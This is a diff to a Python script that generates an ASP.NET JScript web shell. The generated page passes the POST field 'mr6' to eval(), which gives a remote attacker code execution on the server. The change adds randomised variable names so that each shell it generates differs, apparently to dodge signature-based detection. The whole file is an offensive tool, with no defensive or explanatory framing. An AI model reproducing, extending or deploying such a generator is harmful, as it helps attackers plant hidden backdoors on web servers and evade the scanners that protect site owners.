@@ -1,11 +1,14 @@
 import random
 func='unsafe'
+str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 def random_list():
-    str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
     str_random=list(str1)
     random.shuffle(str_random)
     return ''.join(str_random)
 
+def random_name(len):
+
+    return ''.join(random.sample(str1,len))   
 
 def random_index():
     ids=[]
@@ -25,13 +28,13 @@ def shell_main():
     text='''
 <%@ Page Language="Jscript" Debug=true%>
 <%
-var a='{0}';
-var b=Request.Form("mr6");
-var c={1};
-eval(b,c);
+var {2}='{0}';
+var {3}=Request.Form("mr6");
+var {4}={1};
+eval({3},{4});
 %>
     '''
     str_random,payload=random_index()
-    res=text.format(str_random,payload)
+    res=text.format(str_random,payload,random_name(4),random_name(4),random_name(4))
     print(res)
 shell_main()
